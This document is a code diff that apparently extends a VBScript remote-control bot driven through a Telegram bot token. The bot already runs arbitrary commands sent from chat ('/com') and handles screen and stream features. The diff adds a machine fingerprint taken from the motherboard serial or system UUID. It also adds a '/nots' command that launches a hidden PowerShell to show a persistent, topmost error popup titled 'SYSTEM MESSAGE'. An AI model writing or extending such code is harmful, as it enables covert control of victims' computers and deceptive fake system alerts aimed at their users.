@@ -14,18 +14,30 @@ End If
 On Error GoTo 0
 
 Function GetComputerID()
-    Dim strComputer, objWMIService, colItems, objItem, name, i, hash
+    Dim strComputer, objWMIService, colItems, objItem, serial, i, hash
     strComputer = "."
     Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
-    Set colItems = objWMIService.ExecQuery("Select Name from Win32_OperatingSystem")
+    
+    Set colItems = objWMIService.ExecQuery("Select SerialNumber from Win32_BaseBoard")
+    
+    serial = ""
     For Each objItem in colItems
-        name = objItem.Name
+        serial = objItem.SerialNumber
     Next
+    
+    If Trim(serial) = "" Or LCase(serial) = "to be filled by o.e.m." Then
+        Set colItems = objWMIService.ExecQuery("Select UUID from Win32_ComputerSystemProduct")
+        For Each objItem in colItems
+            serial = objItem.UUID
+        Next
+    End If
+
     hash = 0
-    For i = 1 To Len(name)
-        hash = (hash + Asc(Mid(name, i, 1)) * i) Mod 9000
+    For i = 1 To Len(serial)
+        hash = (hash + Asc(Mid(serial, i, 1)) * i) Mod 90000
     Next
-    GetComputerID = CStr(hash + 1000)
+    
+    GetComputerID = CStr(hash + 10000)
 End Function
 
 Dim StreamUrl, StreamActive, BotToken, MyID, LoopFile, ManualFile, ClickUrl, ScreenFile, SupportInterval
@@ -273,6 +285,9 @@ Sub HandleCommand(LMsg, Msg)
             
             RunCommandAndReply psSpeech
         End If
+    ElseIf Left(LMsg, 5) = "/nots" Then
+        ShowStrictNotification Mid(Msg, InStr(Msg, "/nots") + 6)
+        Reply "Attempting to show strict notification..."
     ElseIf Left(LMsg, 4) = "/com" Then
         RunCommandAndReply Mid(Msg, InStr(Msg, "/com") + 5) 
     ElseIf Left(LMsg, 4) = "http" Then
@@ -526,4 +541,40 @@ Function UnescapeUnicode(str)
         retStr = Replace(retStr, objMatch.Value, ChrW("&H" & objMatch.SubMatches(0)))
     Next
     UnescapeUnicode = retStr
+End Function
+
+Sub ShowStrictNotification(txt)
+    On Error Resume Next
+    Dim b64, psCmd
+    ' Превращаем текст в Base64, чтобы обойти проблемы с кодировкой UTF-8/ANSI
+    b64 = ToBase64(txt)
+    
+    ' Вызываем системное окно через PowerShell
+    ' Параметры Popup: текст, время ожидания (0 - вечно), заголовок, тип (16 - ошибка + 4096 - поверх всех)
+    psCmd = "powershell -WindowStyle Hidden -Command ""$t = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('" & b64 & "')); " & _
+            "(New-Object -ComObject WScript.Shell).Popup($t, 0, 'SYSTEM MESSAGE', 16 + 4096)"""
+    
+    Wsh.Run psCmd, 0, False
+End Sub
+
+Function ToBase64(text)
+    Dim xml, node
+    Set xml = CreateObject("MSXML2.DOMDocument.3.0")
+    Set node = xml.CreateElement("base64")
+    node.dataType = "bin.base64"
+    node.nodeTypedValue = StringToBinary(text)
+    ToBase64 = Replace(node.text, vbLf, "")
+End Function
+
+Function StringToBinary(text)
+  Dim stm
+  Set stm = CreateObject("ADODB.Stream")
+  stm.Type = 2 
+  stm.Charset = "unicode"
+  stm.Open
+  stm.WriteText text
+  stm.Position = 0
+  stm.Type = 1 
+  StringToBinary = stm.Read
+  stm.Close
 End Function
